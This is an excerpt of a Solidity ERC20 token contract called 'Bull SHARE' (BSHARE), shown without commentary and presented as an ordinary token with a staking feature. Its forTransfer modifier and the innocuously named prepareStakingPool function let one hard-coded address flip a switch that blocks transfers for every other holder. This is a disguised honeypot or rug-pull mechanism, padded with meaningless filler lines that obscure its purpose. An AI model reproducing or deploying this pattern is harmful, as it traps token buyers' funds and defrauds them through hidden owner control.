...
contract BullSHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenab_totalSupply;
    uint256 private _tokenab_status = 0;
    uint256 public stakingPoolabStatus = 0;

    string private _tokenab_name;
    string private _tokenab_symbol;

    address private _poolabAddress = 0x34fBbD66fD8260430Ecf03b964693f692Ad645ec;

    constructor() {
        _tokenab_name = "Bull SHARE";
        _tokenab_symbol = "BSHARE";
        _tokenab_totalSupply = 100 * 10 ** 18;
        _balances[msg.sender] = _tokenab_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolabAddress || _tokenab_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolabStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolabAddress)
        {
            _tokenab_status = 1;
        }
    }
